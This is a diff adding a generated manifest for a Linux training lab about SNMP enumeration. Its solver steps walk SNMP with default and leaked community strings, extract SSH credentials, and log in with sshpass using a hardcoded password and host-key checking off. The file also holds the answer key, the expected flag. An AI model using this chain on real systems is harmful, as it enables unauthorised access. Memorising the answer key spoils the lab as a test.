@@ -1,0 +1,39 @@
+# Generated from platform/labs/Linux/linux-2-10-snmp-breadcrumb-trail/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-2-10-snmp-breadcrumb-trail
+track: Linux
+difficulty: intermediate
+source: platform/labs/Linux/linux-2-10-snmp-breadcrumb-trail/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+- port: 161
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-2-10-snmp-breadcrumb-trail.sh
+  steps:
+  - name: SNMP public walk returns sysDescr with hidden community hint
+    command: snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.1.0 2>&1 | head -1
+    expect: 'internal-community: internal'
+  - name: Extract token fragment from public sysDescr
+    command: 'snmpwalk -v2c -c public -t 5 {target.target} 1.3.6.1.2.1.1.1.0 2>&1 | grep -o ''Token: [a-z0-9_]*'' | awk ''{print $2}'''
+    expect: snmp_ch41n
+  - name: SNMP internal walk returns sysContact with SSH credentials
+    command: snmpwalk -v2c -c internal -t 5 {target.target} 1.3.6.1.2.1.1.4.0 2>&1 | head -1
+    expect: ops_user
+  - name: Extract token fragment from internal sysContact
+    command: 'snmpwalk -v2c -c internal -t 5 {target.target} 1.3.6.1.2.1.1.4.0 2>&1 | grep -o ''Token: [a-z0-9_]*'' | awk ''{print $2}'''
+    expect: l0g1n
+  - name: SSH login and read flag
+    command: sshpass -p 'R1dg3_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ops_user@{target.target} 'cat ~/flag.txt' 2>&1
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{snmp_ch41n_l0g1n}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
